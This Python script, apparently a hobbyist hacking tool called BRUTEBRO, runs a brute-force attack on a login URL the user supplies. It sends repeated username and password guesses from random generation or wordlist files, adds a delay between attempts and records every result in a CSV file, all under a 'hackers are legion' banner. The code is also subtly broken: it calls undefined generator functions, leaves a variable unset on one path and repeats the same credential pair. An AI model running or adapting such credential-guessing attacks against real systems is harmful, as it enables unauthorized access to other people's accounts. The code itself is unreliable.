import csv
import getpass
import random
import string
import time
import requests

# Function to simulate a login attempt using a POST request
def attempt_login(username, password, login_url):
    login_payload = {
        'username_field_name': username,
        'password_field_name': password,
    }

    try:
        response = requests.post(login_url, data=login_payload)
        if response.status_code == 200:
            if "Login successful" in response.text:
                return "Login successful"
    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the login attempt: {e}")

    return "Login failed"

# Get the username of the currently logged-in user
username = getpass.getuser()

# Print title in red
print("\033[91m" + r'''


BBBBBBBBBBBBBBBBB   RRRRRRRRRRRRRRRRR   UUUUUUUU     UUUUUUUUTTTTTTTTTTTTTTTTTTTTTTTEEEEEEEEEEEEEEEEEEEEEEBBBBBBBBBBBBBBBBB   RRRRRRRRRRRRRRRRR        OOOOOOOOO     
B::::::::::::::::B  R::::::::::::::::R  U::::::U     U::::::UT:::::::::::::::::::::TE::::::::::::::::::::EB::::::::::::::::B  R::::::::::::::::R     OO:::::::::OO   
B::::::BBBBBB:::::B R::::::RRRRRR:::::R U::::::U     U::::::UT:::::::::::::::::::::TE::::::::::::::::::::EB::::::BBBBBB:::::B R::::::RRRRRR:::::R  OO:::::::::::::OO 
BB:::::B     B:::::BRR:::::R     R:::::RUU:::::U     U:::::UUT:::::TT:::::::TT:::::TEE::::::EEEEEEEEE::::EBB:::::B     B:::::BRR:::::R     R:::::RO:::::::OOO:::::::O
  B::::B     B:::::B  R::::R     R:::::R U:::::U     U:::::U TTTTTT  T:::::T  TTTTTT  E:::::E       EEEEEE  B::::B     B:::::B  R::::R     R:::::RO::::::O   O::::::O
  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T          E:::::E               B::::B     B:::::B  R::::R     R:::::RO:::::O     O:::::O
  B::::BBBBBB:::::B   R::::RRRRRR:::::R  U:::::D     D:::::U         T:::::T          E::::::EEEEEEEEEE     B::::BBBBBB:::::B   R::::RRRRRR:::::R O:::::O     O:::::O
  B:::::::::::::BB    R:::::::::::::RR   U:::::D     D:::::U         T:::::T          E:::::::::::::::E     B:::::::::::::BB    R:::::::::::::RR  O:::::O     O:::::O
  B::::BBBBBB:::::B   R::::RRRRRR:::::R  U:::::D     D:::::U         T:::::T          E:::::::::::::::E     B::::BBBBBB:::::B   R::::RRRRRR:::::R O:::::O     O:::::O
  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T          E::::::EEEEEEEEEE     B::::B     B:::::B  R::::R     R:::::RO:::::O     O:::::O
  B::::B     B:::::B  R::::R     R:::::R U:::::D     D:::::U         T:::::T          E:::::E               B::::B     B:::::B  R::::R     R:::::RO:::::O     O:::::O
  B::::B     B:::::B  R::::R     R:::::R U::::::U   U::::::U         T:::::T          E:::::E       EEEEEE  B::::B     B:::::B  R::::R     R:::::RO::::::O   O::::::O
BB:::::BBBBBB::::::BRR:::::R     R:::::R U:::::::UUU:::::::U       TT:::::::TT      EE::::::EEEEEEEE:::::EBB:::::BBBBBB::::::BRR:::::R     R:::::RO:::::::OOO:::::::O
B:::::::::::::::::B R::::::R     R:::::R  UU:::::::::::::UU        T:::::::::T      E::::::::::::::::::::EB:::::::::::::::::B R::::::R     R:::::R OO:::::::::::::OO 
B::::::::::::::::B  R::::::R     R:::::R    UU:::::::::UU          T:::::::::T      E::::::::::::::::::::EB::::::::::::::::B  R::::::R     R:::::R   OO:::::::::OO   
BBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR      UUUUUUUUU            TTTTTTTTTTT      EEEEEEEEEEEEEEEEEEEEEEBBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR     OOOOOOOOO     







''' + "\033[0m")

# Print version in blue
print("\033[94mVersion 2.2\033[0m")

# Print greeting and quote in green
quotes = [
    "Nothing can stop you and me! :)",
    "In the world of hackers, you are the chosen one.",
    "We are the knights of the digital realm!",
    "Together, we break the binary barriers!",
    "Your code is poetry to the machines.",
    "Fear not, for the firewall shall yield!",
    "In the silence of the network, your keystrokes echo.",
    "The source code is strong with this one.",
    "May your algorithms be ever efficient.",
    "Binary today, legend tomorrow.",
    "Hacking is not a crime, it's a skill.",
    "The pixels bow to your command.",
    "Decrypting the mysteries of the binary universe.",
    "Weaving dreams in the tapestry of code.",
    "A keystroke in time saves nine bugs.",
]

selected_quote = random.choice(quotes)

print("\033[92mHello, " + username + "!")
print("Fear the hackers, for we are legion!")
print(f"Random Hacker Buddy Quote: {selected_quote}\033[0m")

# Prompt the user to enter the login URL
login_url = input("\033[92mEnter the login URL: \033[0m")

# Prompt the user to enter the number of overall attempts
num_attempts = int(input("\033[92mEnter the number of overall attempts: \033[0m"))

# Prompt the user to choose a password character type
print("\033[92mChoose a password character type:")
print("1. Letters only")
print("2. Numbers only")
print("3. Symbols only")
print("4. Letters, Numbers, and Symbols (default)")
option = int(input("Enter 1, 2, 3, or 4: \033[0m"))

# Handle the chosen option
use_letters = True
use_numbers = True
use_symbols = True

if option == 1:
    use_numbers = use_symbols = False
elif option == 2:
    use_letters = use_symbols = False
elif option == 3:
    use_letters = use_numbers = False

# Prompt the user to choose a password length option
print("\033[92mChoose a password length option:")
print("1. Set a fixed password length")
print("2. Specify a length range")
option = int(input("Enter 1 or 2: \033[0m"))

# Handle the chosen option
if option == 1:
    password_length = int(input("\033[92mEnter the fixed password length: \033[0m"))
else:
    min_length = int(input("\033[92mEnter the minimum password length: \033[0m"))
    max_length = int(input("\033[92mEnter the maximum password length: \033[0m"))

# Prompt the user to enter the delay between attempts
delay_between_attempts = int(input("\033[92mEnter the delay between attempts (in milliseconds, 10 to 10000): \033[0m"))

# Prompt the user to specify a file with pre-made usernames
use_usernames_file = input("\033[92mDo you want to use a file with pre-made usernames? (y/n): \033[0m").lower()

premade_usernames = []

if use_usernames_file == 'y':
    usernames_file_path = input("\033[92mEnter the path to the file with pre-made usernames: \033[0m")
    try:
        with open(usernames_file_path, 'r') as usernames_file:
            premade_usernames = [line.strip() for line in usernames_file if line.strip()]
    except FileNotFoundError:
        print("\033[91mError: File not found. Using random usernames instead.\033[0m")

# Prompt the user to specify a file with pre-made passwords
use_passwords_file = input("\033[92mDo you want to use a file with pre-made passwords? (y/n): \033[0m").lower()

premade_passwords = []

if use_passwords_file == 'y':
    passwords_file_path = input("\033[92mEnter the path to the file with pre-made passwords: \033[0m")
    try:
        with open(passwords_file_path, 'r') as passwords_file:
            premade_passwords = [line.strip() for line in passwords_file if line.strip()]
    except FileNotFoundError:
        print("\033[91mError: File not found. Using random passwords instead.\033[0m")

# Calculate total combinations and estimated time
total_combinations = len(premade_usernames) * len(premade_passwords) or num_attempts
estimated_time = (total_combinations * delay_between_attempts) / 1000  # in seconds

# Display countdown with estimated time
print(f"\033[92mStarting the brute force attack in 10 seconds. Estimated time: {estimated_time:.2f} seconds\033[0m")
for i in range(10, 0, -1):
    print(f"\033[92m{str(i)}...\033[0m")
    time.sleep(1)

# Store results in a CSV file named "PASSWORDS.csv"
with open('PASSWORDS.csv', 'w', newline='') as csvfile:
    fieldnames = ['Username', 'Password', 'Result']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

    writer.writeheader()

    start_time = time.time()

    for username in premade_usernames or [generate_username()]:
        for password in premade_passwords or [generate_password(password_length, use_letters, use_numbers, use_symbols)]:
            for attempt_num in range(1, num_attempts + 1):
                result = attempt_login(username, password, login_url)

                # Visual broadcast of the attempt
                print(f"\033[96mAttempt {attempt_num}: Username - {username}, Password - {password}, Result - {result}\033[0m")

                writer.writerow({'Username': username, 'Password': password, 'Result': result})

                # Calculate and display remaining time
                elapsed_time = time.time() - start_time
                remaining_time = estimated_time - elapsed_time
                print(f"\033[92mTime remaining: {remaining_time:.2f} seconds\033[0m")

print(f"{num_attempts} brute force results written to PASSWORDS.csv.")
